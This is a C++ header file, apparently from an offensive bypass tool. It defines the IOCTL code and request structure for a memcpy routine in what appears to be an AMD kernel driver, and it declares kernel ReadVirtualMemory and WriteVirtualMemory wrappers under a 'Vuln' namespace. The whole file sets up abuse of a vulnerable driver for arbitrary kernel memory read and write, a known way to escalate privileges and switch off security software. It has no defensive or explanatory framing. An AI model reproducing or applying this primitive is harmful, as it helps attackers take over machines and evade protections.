#pragma once
#include "../Bypass.h"

#define FILE_DEVICE_AMD_PDFW    (DWORD)0x8000
#define PDFW_MEMCPY_FUNC        (DWORD)0x805

#define IOCTL_AMDPDFW_MEMCPY CTL_CODE(FILE_DEVICE_AMD_PDFW, PDFW_MEMCPY_FUNC, METHOD_BUFFERED, FILE_ANY_ACCESS) // 0x80002014

typedef struct _PDFW_MEMCPY {
    BYTE    Reserved[16];
    PVOID   Destination;
    PVOID   Source;
    PVOID   Reserved2;
    DWORD   Size;
    DWORD   Reserved3;
} PDFW_MEMCPY, * PPDFW_MEMCPY;

namespace Vuln
{
    BOOL WINAPI WriteVirtualMemory(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG_PTR Address,
        _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
        _In_ ULONG NumberOfBytes);

    BOOL WINAPI ReadVirtualMemory(
        _In_ HANDLE DeviceHandle,
        _In_ ULONG_PTR Address,
        _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
        _In_ ULONG NumberOfBytes);
}